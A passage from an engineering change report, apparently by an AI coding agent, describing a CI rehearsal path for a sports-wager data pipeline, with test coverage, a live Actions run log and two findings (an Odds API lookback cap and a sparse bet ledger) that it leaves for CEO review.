| A rehearsal can never write to `main` | `test_feature_branch_rehearsal_never_resolves_to_the_default_branch` (4 branch shapes) |
| Ambiguity fails instead of defaulting | `test_ambiguous_state_raises_instead_of_defaulting_to_main` (10 states) |
| No shell injection | `test_malformed_or_injecting_branch_names_are_rejected` (18 payloads) + `test_resolver_step_passes_context_by_env_not_by_interpolation` |
| Failure emits no usable branch | `test_the_resolver_process_exits_nonzero_and_prints_nothing_usable_on_failure` |
| Commit allow-list unchanged | `test_commit_file_allow_list_is_byte_for_byte_unchanged` |
| Wave 0 durability preserved | `test_commit_step_still_persists_output_when_a_later_step_fails` |
| No decision-surface change | `test_wave_0_05_touches_no_model_pricing_or_settlement_file` |

**Mutation-tested.** Removing `--branch` fails
`test_the_resolver_is_what_the_commit_step_actually_uses`; hard-coding
`--branch main` fails the same guard; making the resolver fall back to the
default branch instead of raising fails two `test_ambiguous_state_*` cases.

### 16.1 Live rehearsal — Actions run `34193057325`

`clv-update.yml` dispatched on `claude/wave-0-05-clv-rehearsal-path` with
`date=2026-09-01`. **All 13 steps `success`.** Run began at main
`a086f71d`; the branch went `cd08fbff` → `2c70c5d5`.

**Branch targeting worked.** From the runner log, verbatim:

```
python3 scripts/ci/git_data_commit.py \
  --message "clv update + rule71 report 2026-09-08 02:04 ET" \
  --branch "claude/wave-0-05-clv-rehearsal-path" \
  bets.json BET_LOG.md data/identity_audit.json data/rule71_report.json data/clv_report.json
Push succeeded (attempt 1).
```

`main` moved `a086f71d` → `8fd70cd8` during the window, from **four
`github-actions[bot]` scheduled data commits** (wager research rebuild,
postgame settlement, daily report, corpus compaction) — all data-only, none
from this run. `git merge-base --is-ancestor 2c70c5d5 origin/main` → **NO**:
the rehearsal has **zero commit ancestry on `main`**.

**CR-2 confirmed fixed in real Actions.** The step that raised
`ModuleNotFoundError: No module named 'lib'` on six consecutive nights ran
clean and produced real output:

```
[snapshot_clv] date=2026-09-01  snapshot=kalshi_search_2026-09-01.json
               fetched_at=2026-09-02T02:18:07.000Z  tickers=2909
```

**Credential normalization confirmed.** `Fetching scores (daysFrom=8)...` came
back `HTTP 422 INVALID_SCORES_DAYS_FROM` — a real HTTP response from the Odds
API. Before Wave 0 the trailing whitespace made `http.client` raise
`InvalidURL` locally with no socket opened and no status code at all. A 422
proves the URL was built, sent and authenticated.

### 16.2 Two findings that block the six-date restore as planned

The rehearsal exists to find exactly this, and it did — without touching
production.

**1. The Odds API cannot reach back far enough.** `clv_update.fetch_scores`
computes `days_from = max(1, days_ago + 1)` (`clv_update.py:438`) and the
Odds API `/scores` endpoint caps `daysFrom` at **3**. Run on 2026-09-08:

| Date | `daysFrom` | Result |
|---|---:|---|
| 2026-09-01 | 8 | **HTTP 422** (observed) |
| 2026-09-02 | 7 | HTTP 422 |
| 2026-09-03 | 6 | HTTP 422 |
| 2026-09-04 | 5 | HTTP 422 |
| 2026-09-05 | 4 | HTTP 422 |
| 2026-09-06 | 3 | within cap |

`statsapi.mlb.com` is wired **only** for F5 linescore settlement
(`clv_update.py:332-428`); full-game settlement has a single source,
`fetch_scores()` at `clv_update.py:1477`, with **no fallback**. So five of the
six dates cannot be settled by the canonical path today. Every day of further
delay moves another date out of reach.

**2. The root ledger has almost nothing in the window.** Bets in `bets.json`
dated 2026-09-01…09-06: **one**, on 2026-09-02 (non-terminal). 2026-09-01 and
09-03…09-06 have **zero**. The rehearsal therefore exercised the plumbing
fully but the settlement arithmetic not at all (`Bets for 2026-09-01: 0`).

This does **not** mean the restore is unnecessary — the missing
`data/edgelab/settlements/<date>.jsonl` partitions are the canonical EdgeLab
corpus written by `edgelab-postgame.yml` from *recommendations*, which is a
different population from the root wager ledger. It does mean the restore's
scope and expected effect should be re-derived from the canonical corpus
before it is authorized, rather than assumed from the root ledger.

**Neither finding is fixed here.** Both touch settlement sourcing, which is
outside Wave 0.05's remit. They are reported for the CEO's restore decision.

---

*Wave 0 complete. Wave 0.05 adds the rehearsal path only. The six-date
production restore is NOT started and awaits CEO review. Wave 1 — executable
pricing (CR-1/CR-5), doubleheader slate identity (CR-3), engine consolidation
(CR-6) — is not started and is not authorized by this document.*
